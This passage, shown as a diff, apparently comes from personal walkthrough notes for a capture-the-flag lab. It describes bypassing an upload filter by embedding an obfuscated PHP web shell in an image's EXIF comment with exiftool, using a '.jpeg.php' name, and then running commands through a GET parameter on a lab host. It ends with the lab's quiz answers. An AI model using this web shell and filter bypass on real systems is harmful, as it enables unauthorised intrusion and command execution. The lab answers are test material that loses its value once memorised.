@@ -47,3 +47,36 @@ If you look closely you'll see that this is still very much the same payload as 
 As this is getting passed into a bash command, we will need to escape the dollar signs to prevent them from being interpreted as bash variables. This means our final payload is as follows:  
 `<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>`
 
+With an obfuscated payload, we can now finalise our exploit.
+
+Once again, make a copy of an innocent image (ensuring you give it a name in the format of `shell-USERNAME.jpeg.php`), then use `exiftool` to embed the payload into the image:  
+`exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php`
+
+
+![[98a8bd99378c.webp]]
+
+Upload your shell and attempt to access it!
+
+If this worked then you should get an output similar to the following:
+
+![[6b09145ae074.webp]]
+
+Awesome! We have a shell.
+
+We can now execute commands using the `wreath` GET parameter, e.g:  
+`http://10.200.72.100/resources/uploads/shell-USERNAME.jpeg.php?wreath=systeminfo`
+
+![[2920fdb4cd18.webp]]
+
+
+---
+
+> [!Question]
+>1. What is the Host Name of the target?
+>`WREATH-PC`
+>2. What is our current username (include the domain in this)? 
+>`wreath-pc\thomas`
+
+
+**Next step: ** [[Compiling Netcat & Reverse Shell!]]
+
